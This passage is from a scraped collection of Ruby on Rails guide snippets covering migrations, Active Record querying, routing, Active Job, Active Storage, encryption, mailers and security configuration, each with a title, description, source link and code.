generate migration AddEmailToUsers email:string!\n```\n\n----------------------------------------\n\nTITLE: Silencing Health Check Path in Rails Logs\nDESCRIPTION: This snippet demonstrates how to silence a specific health check path in the Rails logs using `config.silence_healthcheck_path`. This helps prevent health checks from cluttering the production logs, particularly for early-stage applications.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_13\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.silence_healthcheck_path = \"/up\"\n```\n\n----------------------------------------\n\nTITLE: Adding Columns with Modifiers (Ruby)\nDESCRIPTION: This migration adds a `price` column with a specified precision and scale, and a `supplier` column with a polymorphic association to the `products` table.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_23\n\nLANGUAGE: Ruby\nCODE:\n```\nclass AddDetailsToProducts < ActiveRecord::Migration[8.1]\n  def change\n    add_column :products, :price, :decimal, precision: 5, scale: 2\n    add_reference :products, :supplier, polymorphic: true\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Merging Named Scope with Joins in Rails\nDESCRIPTION: This example showcases how to use a named scope (`created_in_time_range`) defined in the `Order` model with `merge` to specify conditions on joined tables. It retrieves all `Customer` objects who have `orders` created within a specific time range, reusing the defined scope.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_145\n\nLANGUAGE: ruby\nCODE:\n```\nclass Order < ApplicationRecord\n  belongs_to :customer\n\n  scope :created_in_time_range, ->(time_range) {\n    where(created_at: time_range)\n  }\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\ntime_range = (Time.now.midnight - 1.day)..Time.now.midnight\nCustomer.joins(:orders).merge(Order.created_in_time_range(time_range)).distinct\n```\n\n----------------------------------------\n\nTITLE: Find Customer by ID (Single)\nDESCRIPTION: Retrieves a single Customer record from the database using the `find` method with a primary key. The method raises an `ActiveRecord::RecordNotFound` exception if no matching record is found. The primary key in this example is the 'id' column.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_6\n\nLANGUAGE: ruby\nCODE:\n```\n# Find the customer with primary key (id) 10.\nirb> customer = Customer.find(10)\n=> #<Customer id: 10, first_name: \"Ryan\">\n```\n\n----------------------------------------\n\nTITLE: Limit Records in Rails\nDESCRIPTION: Demonstrates how to use the `limit` method to restrict the number of records returned by a query.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_89\n\nLANGUAGE: ruby\nCODE:\n```\nCustomer.limit(5)\n```\n\n----------------------------------------\n\nTITLE: Add Column Migration (Ruby)\nDESCRIPTION: This migration adds a 'part_number' column of type string to the 'products' table. It is created using the 'add_column' method.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_7\n\nLANGUAGE: ruby\nCODE:\n```\nclass AddPartNumberToProducts < ActiveRecord::Migration[8.1]\n  def change\n    add_column :products, :part_number, :string\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Enqueuing a job with multiple arguments\nDESCRIPTION: This code enqueues `GuestsCleanupJob` and passes multiple arguments to the `perform` method.  `perform_later` will call `perform` under the hood, so any arguments defined in `perform` are valid to be passed to `perform_later`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_job_basics.md#_snippet_8\n\nLANGUAGE: ruby\nCODE:\n```\n# `perform_now` and `perform_later` will call `perform` under the hood so\n# you can pass as many arguments as defined in the latter.\nGuestsCleanupJob.perform_later(guest1, guest2, filter: \"some_filter\")\n```\n\n----------------------------------------\n\nTITLE: Generating Model with Attributes (Shell)\nDESCRIPTION: This command generates a model and a corresponding migration for a `Product` with `name` (string) and `description` (text) attributes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_20\n\nLANGUAGE: Shell\nCODE:\n```\n$ bin/rails generate model Product name:string description:text\n```\n\n----------------------------------------\n\nTITLE: Calculating the average with average in Rails\nDESCRIPTION: Demonstrates how to use the `average` method to calculate the average value of a specific column in a table.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_205\n\nLANGUAGE: ruby\nCODE:\n```\nOrder.average(\"subtotal\")\n```\n\n----------------------------------------\n\nTITLE: Rails Params Hash Example (Array of Hashes)\nDESCRIPTION: Demonstrates how repeating a form fragment for addresses results in an array of hashes within the params hash.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_72\n\nLANGUAGE: ruby\nCODE:\n```\n{ \"person\" =>\n  { \"addresses\" => [\n    { \"line1\" => \"1000 Fifth Avenue\",\n      \"line2\" => \"\",\n      \"city\" => \"New York\"\n    },\n    { \"line1\" => \"Calle de Ruiz de Alarcón\",\n      \"line2\" => \"\",\n      \"city\" => \"Madrid\"\n    }\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Invoking Rake Tasks from the Command Line in Bash\nDESCRIPTION: Examples of how to run rake tasks from the command line, including tasks with arguments. Shows various patterns for invoking tasks with single or multiple arguments.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/command_line.md#2025-04-23_snippet_21\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails task_name\n$ bin/rails \"task_name[value 1]\" # entire argument string should be quoted\n$ bin/rails \"task_name[value 1,value2,value3]\" # separate multiple args with a comma\n$ bin/rails db:nothing\n```\n\n----------------------------------------\n\nTITLE: Finding Objects in Collection\nDESCRIPTION: Examples of using find, where, and size methods to query associated collections in Rails.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_40\n\nLANGUAGE: ruby\nCODE:\n```\n@book_count = @author.books.size\n```\n\nLANGUAGE: ruby\nCODE:\n```\n@available_book = @author.books.find(1)\n```\n\nLANGUAGE: ruby\nCODE:\n```\n@available_books = @author.books.where(available: true) # No query yet\n@available_book = @available_books.first # Now the database will be queried\n```\n\n----------------------------------------\n\nTITLE: Reverting a previous migration\nDESCRIPTION: Illustrates how to use the `revert` method to undo a previous migration. The `revert` method takes either a migration class or a block of code to reverse. It simplifies the process of reverting changes made in earlier migrations.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_60\n\nLANGUAGE: ruby\nCODE:\n```\nrequire_relative \"20121212123456_example_migration\"\n\nclass FixupExampleMigration < ActiveRecord::Migration[8.1]\n  def change\n    revert ExampleMigration\n\n    create_table(:apples) do |t|\n      t.string :variety\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Setting Up File Field for Direct Upload with FormBuilder\nDESCRIPTION: Shows how to configure a file input field for direct uploads using Rails' form builder helper. The multiple option allows selecting multiple files.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_65\n\nLANGUAGE: erb\nCODE:\n```\n<%= form.file_field :attachments, multiple: true, direct_upload: true %>\n```\n\n----------------------------------------\n\nTITLE: Accessing Base Errors in Rails Console\nDESCRIPTION: This snippet shows how to access base errors in the Rails console. It demonstrates retrieving the full message for an error added to the :base attribute.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_72\n\nLANGUAGE: ruby\nCODE:\n```\nirb> person = Person.new\nirb> person.errors.where(:base).first.full_message\n=> \"This person is invalid because ...\"\n```\n\n----------------------------------------\n\nTITLE: Broadcasting Turbo Stream in Ruby Model\nDESCRIPTION: Example of using a model callback to broadcast a Turbo Stream after creating a new Post record.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/working_with_javascript_in_rails.md#2025-04-23_snippet_9\n\nLANGUAGE: ruby\nCODE:\n```\nclass Post < ApplicationRecord\n  after_create_commit { broadcast_append_to(\"posts\") }\nend\n```\n\n----------------------------------------\n\nTITLE: Generator with Description\nDESCRIPTION: Enhanced generator implementation including a description using the desc method\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/generators.md#2025-04-23_snippet_3\n\nLANGUAGE: ruby\nCODE:\n```\nclass InitializerGenerator < Rails::Generators::Base\n  desc \"This generator creates an initializer file at config/initializers\"\n  def create_initializer_file\n    create_file \"config/initializers/initializer.rb\", <<~RUBY\n      # Add initialization content here\n    RUBY\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Redirecting with Flash Messages - Ruby\nDESCRIPTION: This snippet illustrates how to set flash messages directly within the `redirect_to` method.  The `notice` and `alert` keys are used to pass messages along with the redirect. This avoids the need to explicitly set `flash[:notice]` or `flash[:alert]` before redirection.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_overview.md#_snippet_27\n\nLANGUAGE: ruby\nCODE:\n```\nredirect_to root_url, notice: \"You have successfully logged out.\"\nredirect_to root_url, alert: \"There was an issue.\"\n```\n\n----------------------------------------\n\nTITLE: Retrieving Ciphertext for an Attribute - Ruby\nDESCRIPTION: Shows how to fetch the raw encrypted (ciphertext) value for a given attribute from an Active Record model. Requires an instance of a model with encrypted attributes, with the key parameter as a symbol naming the attribute. Returns the encrypted string as stored in the database.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_encryption.md#2025-04-23_snippet_16\n\nLANGUAGE: ruby\nCODE:\n```\narticle.ciphertext_for(:title)\n```\n\n----------------------------------------\n\nTITLE: Defining Nested Resources in Rails\nDESCRIPTION: This snippet illustrates how to define nested resources in Rails using the `resources` block. This creates routes that reflect the parent-child relationship between resources, such as magazines and ads.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_10\n\nLANGUAGE: ruby\nCODE:\n```\nclass Magazine < ApplicationRecord\n  has_many :ads\nend\n\nclass Ad < ApplicationRecord\n  belongs_to :magazine\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\nresources :magazines do\n  resources :ads\nend\n```\n\n----------------------------------------\n\nTITLE: Preventing Deadlocks with permit_concurrent_loads in Ruby Rails\nDESCRIPTION: This example demonstrates how to use `permit_concurrent_loads` to prevent deadlocks. It allows the inner thread to acquire the 'load' lock, load the User constant, and continue execution while the outer thread waits without holding any lock.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/threading_and_code_execution.md#2025-04-23_snippet_5\n\nLANGUAGE: ruby\nCODE:\n```\nRails.application.executor.wrap do\n  th = Thread.new do\n    Rails.application.executor.wrap do\n      User # inner thread can acquire the 'load' lock,\n           # load User, and continue\n    end\n  end\n\n  ActiveSupport::Dependencies.interlock.permit_concurrent_loads do\n    th.join # outer thread waits here, but has no lock\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Building Account via build_account on Supplier - Ruby\nDESCRIPTION: Builds but does not save a new Account associated to a Supplier. Sets up the association and populates with passed attributes, e.g., terms. Useful during form object instantiation before persist or validation.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_30\n\nLANGUAGE: ruby\nCODE:\n```\n@account = @supplier.build_account(terms: \\\"Net 30\\\")\n```\n\n----------------------------------------\n\nTITLE: Finding Record by ID in Rails\nDESCRIPTION: This snippet retrieves a single record from the database based on its ID using the `find` method in ActiveRecord. It generates a SQL `SELECT` query with a `WHERE` clause that filters for a specific `id`. It returns a single `Product` instance.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_25\n\nLANGUAGE: irb\nCODE:\n```\nstore(dev)> Product.find(1)\n  Product Load (0.2ms)  SELECT \"products\".* FROM \"products\" WHERE \"products\".\"id\" = 1 LIMIT 1 /*application='Store'*/\n=> #<Product:0x000000012054af08 id: 1, name: \"T-Shirt\", created_at: \"2024-11-09 16:35:01.117836000 +0000\", updated_at: \"2024-11-09 16:35:01.117836000 +0000\">\n```\n\n----------------------------------------\n\nTITLE: Filtering Sensitive Parameters from Logs in Rails\nDESCRIPTION: Shows how to prevent sensitive information like passwords from being recorded in Rails log files. This adds parameters to the filter list, which will be marked as [FILTERED] in logs to protect sensitive data from exposure.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_24\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.filter_parameters << :password\n```\n\n----------------------------------------\n\nTITLE: Defining an Active Job with a specific queue in Rails\nDESCRIPTION: This code snippet defines an Active Job named `GuestsCleanupJob` and assigns it to the `high_priority` queue using `queue_as`. When `config.active_job.queue_name_prefix` is set, the job will be queued on `[prefix]_high_priority` queue.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_69\n\nLANGUAGE: ruby\nCODE:\n```\nclass GuestsCleanupJob < ActiveJob::Base\n  queue_as :high_priority\n  #....\nend\n```\n\n----------------------------------------\n\nTITLE: Error Handling in Active Record Validations\nDESCRIPTION: Demonstrates various validation error scenarios and error handling methods in Active Record.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_6\n\nLANGUAGE: ruby\nCODE:\n```\nclass Person < ApplicationRecord\n  validates :name, presence: true\nend\n```\n\n----------------------------------------\n\nTITLE: Defining has_many_attached Relationship in Ruby on Rails Model\nDESCRIPTION: Demonstrates how to set up a one-to-many relationship between a model and files using the has_many_attached macro in a Rails model. This allows a Message model to have multiple images attached to it.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_25\n\nLANGUAGE: ruby\nCODE:\n```\nclass Message < ApplicationRecord\n  has_many_attached :images\nend\n```\n\n----------------------------------------\n\nTITLE: Evaluating Ruby Code within the Debugger Session (debug gem)\nDESCRIPTION: Illustrates interacting with the `debug` gem's session by typing Ruby code directly at the `(rdbg)` prompt. This allows inspection of the application's state at the breakpoint, such as checking the values of instance variables (`@posts`) or the current object (`self`).\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/debugging_rails_applications.md#2025-04-23_snippet_16\n\nLANGUAGE: text\nCODE:\n```\n(rdbg) @posts    # ruby\n[]\n(rdbg) self\n#<PostsController:0x0000000000aeb0>\n(rdbg)\n```\n\n----------------------------------------\n\nTITLE: Find or Create with create_with in Rails\nDESCRIPTION: This Ruby code demonstrates the use of `create_with` in conjunction with `find_or_create_by`. If a customer with the first name 'Andy' does not exist, a new customer is created with `locked` set to false.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_187\n\nLANGUAGE: ruby\nCODE:\n```\nCustomer.create_with(locked: false).find_or_create_by(first_name: \"Andy\")\n```\n\n----------------------------------------\n\nTITLE: Routing HTTP GET request to a controller action using controller and action options\nDESCRIPTION: This code snippet illustrates an alternative way to define a route using the `controller:` and `action:` options instead of the `to:` option. It maps the `/users/:id` path to the `show` action of the `UsersController`, demonstrating flexibility in route configuration.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_1\n\nLANGUAGE: ruby\nCODE:\n```\nget \"/users/:id\", controller: \"users\", action: :show\n```\n\n----------------------------------------\n\nTITLE: Configuring Cache Store Serializer to MessagePack - Ruby on Rails - Ruby\nDESCRIPTION: Explains two approaches to configure the Rails cache store to use MessagePack as its serializer, either globally in the config or per-instance via ActiveSupport::Cache.lookup_store. Ensures cache entries are serialized with MessagePack for performance benefits. To use, set in initialization code or wherever cache store is configured.\n\n- Dependencies: Rails >= 7.1, msgpack gem\n- Parameters: cache path, store type, serializer\n- Input/Output: Cache objects stored as MessagePack-formatted.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/7_1_release_notes.md#2025-04-23_snippet_13\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.cache_store = :file_store, \"tmp/cache\", { serializer: :message_pack }\n\n# Or individually:\nActiveSupport::Cache.lookup_store(:file_store, \"tmp/cache\", serializer: :message_pack)\n```\n\n----------------------------------------\n\nTITLE: Defining an Article Model for a View - Rails Model - Ruby\nDESCRIPTION: Defines a Rails model Article mapping to the articles view, setting the primary key, and providing an archive! method to mark articles as archived. Depends on the previously defined view and inherits ApplicationRecord. Inputs are attribute updates; output is a persisted change in the underlying view/table.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_postgresql.md#2025-04-23_snippet_21\n\nLANGUAGE: ruby\nCODE:\n```\n# app/models/article.rb\\nclass Article < ApplicationRecord\\n  self.primary_key = \\\"id\\\"\\n  def archive!\\n    update_attribute :archived, true\\n  end\\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Compression for Encrypted Attributes\nDESCRIPTION: Demonstrates how to configure compression settings for encrypted attributes including custom compression algorithms.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_encryption.md#2025-04-23_snippet_10\n\nLANGUAGE: ruby\nCODE:\n```\nclass Article < ApplicationRecord\n  encrypts :content, compress: false\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\nrequire \"zstd-ruby\"\n\nmodule ZstdCompressor\n  def self.deflate(data)\n    Zstd.compress(data)\n  end\n\n  def self.inflate(data)\n    Zstd.decompress(data)\n  end\nend\n\nclass User\n  encrypts :name, compressor: ZstdCompressor\nend\n```\n\n----------------------------------------\n\nTITLE: Converting Parameters to Hash in Rails 5\nDESCRIPTION: Demonstrates how to handle parameters in Rails 5 where ActionController::Parameters no longer inherits from HashWithIndifferentAccess. This shows how to permit and convert parameters to a hash.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_50\n\nLANGUAGE: ruby\nCODE:\n```\nparams.permit([:proceed_to, :return_to]).to_h\n```\n\n----------------------------------------\n\nTITLE: Implementing HTTP Token Authentication in Rails Controller\nDESCRIPTION: Shows how to implement token-based authentication in a Rails controller using authenticate_or_request_with_http_token. The example demonstrates setting up a static token and comparing it securely with the provided authentication token.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_advanced_topics.md#2025-04-23_snippet_7\n\nLANGUAGE: ruby\nCODE:\n```\nclass PostsController < ApplicationController\n  TOKEN = \"secret\"\n\n  before_action :authenticate\n\n  private\n    def authenticate\n      authenticate_or_request_with_http_token do |token, options|\n        ActiveSupport::SecurityUtils.secure_compare(token, TOKEN)\n      end\n    end\nend\n```\n\n----------------------------------------\n\nTITLE: Generating Foreign Key Column Name in Ruby\nDESCRIPTION: This code demonstrates how to generate a foreign key column name from a class name using the `foreign_key` method. It demodulizes, underscores, and adds \"_id\" to the class name. The method is part of ActiveSupport core extensions to the String class.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_87\n\nLANGUAGE: ruby\nCODE:\n```\n\"User\".foreign_key           # => \"user_id\"\n\"InvoiceLine\".foreign_key    # => \"invoice_line_id\"\n\"Admin::Session\".foreign_key # => \"session_id\"\n```\n\n----------------------------------------\n\nTITLE: Customizing Mail Template Path and Name in Rails (Ruby)\nDESCRIPTION: This snippet demonstrates a Rails mailer where the mail method is provided with template_path and template_name options, allowing the lookup of the email template from a custom directory and file instead of the default. Requires an ApplicationMailer and a template available at app/views/notifications/hello. Parameters include the recipient email, subject, template path, and template name. The mail content is rendered from the specified template.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailer_basics.md#2025-04-23_snippet_13\n\nLANGUAGE: ruby\nCODE:\n```\nclass UserMailer < ApplicationMailer\n  default from: \"notifications@example.com\"\n\n  def welcome_email\n    @user = params[:user]\n    @url  = \"http://example.com/login\"\n    mail(to: @user.email,\n         subject: \"Welcome to My Awesome Site\",\n         template_path: \"notifications\",\n         template_name: \"hello\")\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Using `blank?` for Checking Presence\nDESCRIPTION: This example shows the use of the `blank?` method to check if a token is present. It leverages the Active Support extension to efficiently determine if a value is considered 'blank'.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_6\n\nLANGUAGE: ruby\nCODE:\n```\ndef authenticate(controller, &login_procedure)\n  token, options = token_and_options(controller.request)\n  unless token.blank?\n    login_procedure.call(token, options)\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Using Routing Concerns in Resources\nDESCRIPTION: This snippet demonstrates how to include routing concerns in resources using the `concerns` option.  It includes the `:commentable` concern in the `messages` resource and both `:commentable` and `:image_attachable` concerns in the `articles` resource. This avoids code duplication and promotes consistency in route definitions.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_19\n\nLANGUAGE: ruby\nCODE:\n```\nresources :messages, concerns: :commentable\n\nresources :articles, concerns: [:commentable, :image_attachable]\n```\n\n----------------------------------------\n\nTITLE: Adding a Polymorphic Association\nDESCRIPTION: This code snippet shows how to add a polymorphic association using `add_belongs_to` which is an alias for `add_reference`. It creates `taggable_type` and `taggable_id` columns on the `taggings` table.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_46\n\nLANGUAGE: ruby\nCODE:\n```\nadd_belongs_to :taggings, :taggable, polymorphic: true\n```\n\n----------------------------------------\n\nTITLE: Using where.associated in Rails\nDESCRIPTION: This snippet demonstrates how to use `where.associated` to select records based on the presence of an association. It retrieves all customers that have made at least one review.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_147\n\nLANGUAGE: ruby\nCODE:\n```\nCustomer.where.associated(:reviews)\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT customers.* FROM customers\nINNER JOIN reviews ON reviews.customer_id = customers.id\nWHERE reviews.id IS NOT NULL\n```\n\n----------------------------------------\n\nTITLE: Text Email Template for Welcome Email\nDESCRIPTION: Creates a plain text template for the welcome email as a fallback for clients that can't render HTML. This is stored as welcome_email.text.erb and contains similar content to the HTML version.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailer_basics.md#2025-04-23_snippet_7\n\nLANGUAGE: erb\nCODE:\n```\nWelcome to example.com, <%= @user.name %>\n===============================================\n\nYou have successfully signed up to example.com,\nyour username is: <%= @user.login %>.\n\nTo login to the site, just follow this link: <%= @url %>.\n\nThanks for joining and have a great day!\n```\n\n----------------------------------------\n\nTITLE: Form Partial (_form.html.erb)\nDESCRIPTION: This code snippet represents a form partial that utilizes the `form_with` helper to create a form for a `zone` model. It defines a text field for the zone name and a submit button. The rendered output will vary based on whether it is creating a new record or updating an existing record due to Rails' `form_with` helper.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_78\n\nLANGUAGE: html+erb\nCODE:\n```\n<%= form_with model: zone do |form| %>\n  <p>\n    <b>Zone name</b><br>\n    <%= form.text_field :name %>\n  </p>\n  <p>\n    <%= form.submit %>\n  </p>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Implementing Custom Type Encryption\nDESCRIPTION: Example showing the correct way to implement encryption with custom serialized types in Active Record models.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_encryption.md#2025-04-23_snippet_5\n\nLANGUAGE: ruby\nCODE:\n```\n# CORRECT\nclass Article < ApplicationRecord\n  serialize :title, type: Title\n  encrypts :title\nend\n\n# INCORRECT\nclass Article < ApplicationRecord\n  encrypts :title\n  serialize :title, type: Title\nend\n```\n\n----------------------------------------\n\nTITLE: Permitting _destroy Parameter in Rails Controller\nDESCRIPTION: This Ruby code shows how to update the permitted parameters in the controller to include the `_destroy` field.  The `_destroy` parameter needs to be explicitly permitted for `accepts_nested_attributes_for` with `allow_destroy: true` to function correctly.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_85\n\nLANGUAGE: ruby\nCODE:\n```\ndef person_params\n  params.require(:person).\n    permit(:name, addresses_attributes: [:id, :kind, :street, :_destroy])\nend\n```\n\n----------------------------------------\n\nTITLE: Set PostgreSQL Datetime Type to Timestamp with Time Zone - Ruby\nDESCRIPTION: This snippet shows how to configure the PostgreSQL adapter to use \"timestamp with time zone\" when `datetime` is called in a migration or schema.  The default is `:timestamp` (timestamp without time zone).  You'll need to run `bin/rails db:migrate` after this change.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_44\n\nLANGUAGE: ruby\nCODE:\n```\n# config/application.rb\n\nActiveSupport.on_load(:active_record_postgresqladapter) do\n  self.datetime_type = :timestamptz\nend\n```\n\n----------------------------------------\n\nTITLE: Implementing API Controller Actions in Ruby on Rails\nDESCRIPTION: Example of a Rails controller (GroupsController) configured for API use, demonstrating CRUD operations with JSON responses.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_app.md#2025-04-23_snippet_2\n\nLANGUAGE: ruby\nCODE:\n```\n# app/controllers/groups_controller.rb\nclass GroupsController < ApplicationController\n  before_action :set_group, only: %i[ show update destroy ]\n\n  # GET /groups\n  def index\n    @groups = Group.all\n\n    render json: @groups\n  end\n\n  # GET /groups/1\n  def show\n    render json: @group\n  end\n\n  # POST /groups\n  def create\n    @group = Group.new(group_params)\n\n    if @group.save\n      render json: @group, status: :created, location: @group\n    else\n      render json: @group.errors, status: :unprocessable_entity\n    end\n  end\n\n  # PATCH/PUT /groups/1\n  def update\n    if @group.update(group_params)\n      render json: @group\n    else\n      render json: @group.errors, status: :unprocessable_entity\n    end\n  end\n\n  # DELETE /groups/1\n  def destroy\n    @group.destroy\n  end\n\n  private\n    # Use callbacks to share common setup or constraints between actions.\n    def set_group\n      @group = Group.find(params[:id])\n    end\n\n    # Only allow a list of trusted parameters through.\n    def group_params\n      params.expect(group: [:name])\n    end\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Queue Adapter Globally in Rails\nDESCRIPTION: This code snippet demonstrates how to configure the queue adapter for Active Job globally within a Rails application.  It involves setting the `config.active_job.queue_adapter` option in the `config/application.rb` file. This ensures that all jobs, unless otherwise specified, will use the chosen adapter. Make sure to include the adapter's gem in the Gemfile.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_job_basics.md#_snippet_42\n\nLANGUAGE: ruby\nCODE:\n```\n# config/application.rb\nmodule YourApp\n  class Application < Rails::Application\n    # Be sure to have the adapter's gem in your Gemfile\n    # and follow the adapter's specific installation\n    # and deployment instructions.\n    config.active_job.queue_adapter = :sidekiq\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Validating Attribute Comparison in Rails Model (Ruby)\nDESCRIPTION: Uses the `comparison` validator in a `Promotion` model to ensure the `end_date` attribute is strictly greater than the `start_date` attribute. This validator requires a comparison option (e.g., `:greater_than`) and works with any class including the `Comparable` module.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_18\n\nLANGUAGE: ruby\nCODE:\n```\nclass Promotion < ApplicationRecord\n  validates :end_date, comparison: { greater_than: :start_date }\nend\n```\n\n----------------------------------------\n\nTITLE: Purging Unattached Active Storage Blobs with Rake Task\nDESCRIPTION: Custom rake task that purges unattached Active Storage blobs that are older than two days using the unattached scope and purge_later method.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_85\n\nLANGUAGE: ruby\nCODE:\n```\nnamespace :active_storage do\n  desc \"Purges unattached Active Storage blobs. Run regularly.\"\n  task purge_unattached: :environment do\n    ActiveStorage::Blob.unattached.where(created_at: ..2.days.ago).find_each(&:purge_later)\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Query Books by Date Range Using Placeholder Conditions in Ruby\nDESCRIPTION: This snippet demonstrates using named placeholders in the conditions string of the `where` method, making the query more readable, especially with multiple conditions.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_56\n\nLANGUAGE: ruby\nCODE:\n```\nBook.where(\"created_at >= :start_date AND created_at <= :end_date\",\n  { start_date: params[:start_date], end_date: params[:end_date] })\n```\n\n----------------------------------------\n\nTITLE: Sanitizing HTML Content with sanitize Helper in Ruby\nDESCRIPTION: Shows the basic usage of the `sanitize` helper from Action View's SanitizeHelper. It HTML encodes all tags and strips all attributes that aren't specifically allowed by default, helping prevent XSS attacks.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_helpers.md#2025-04-23_snippet_19\n\nLANGUAGE: ruby\nCODE:\n```\nsanitize @article.body\n```\n\n----------------------------------------\n\nTITLE: Creating and Saving Associated Object via create_association - Ruby\nDESCRIPTION: Instantiates and immediately saves a new associated Author for a Book. Attributes are passed for the new Author, and saving includes ActiveRecord validations. Fails silently if validation fails and returns the unsaved object; does not raise an exception.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_18\n\nLANGUAGE: ruby\nCODE:\n```\n@author = @book.create_author(author_number: 123,\\n                              author_name: \\\"John Doe\\\")\n```\n\n----------------------------------------\n\nTITLE: Configuring Per-Attribute Encryption Key in Rails Model - Ruby\nDESCRIPTION: Defines an Active Record model with a specific encryption key for the :summary attribute using the encrypts method, leveraging the Rails Active Record Encryption framework. Required dependency is Active Record with encryption enabled. 'key' is the raw key to use for encrypting and decrypting the summary attribute, scoped only to this specific attribute. Requires secret key management and works only with Rails' native encryption support.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_encryption.md#2025-04-23_snippet_12\n\nLANGUAGE: ruby\nCODE:\n```\nclass Article < ApplicationRecord\n  encrypts :summary, key: \"some secret key for article summaries\"\nend\n```\n\n----------------------------------------\n\nTITLE: Encrypting Action Text Content\nDESCRIPTION: Example of encrypting Action Text rich text content in a Rails model.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_encryption.md#2025-04-23_snippet_4\n\nLANGUAGE: ruby\nCODE:\n```\nclass Message < ApplicationRecord\n  has_rich_text :content, encrypted: true\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Permissions-Policy (Feature-Policy) in Ruby on Rails\nDESCRIPTION: This snippet demonstrates how to configure the Permissions-Policy (formerly Feature-Policy) header in Rails to allow or block the use of specific browser features.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_73\n\nLANGUAGE: ruby\nCODE:\n```\n# config/initializers/permissions_policy.rb\nRails.application.config.permissions_policy do |policy|\n  policy.camera      :none\n  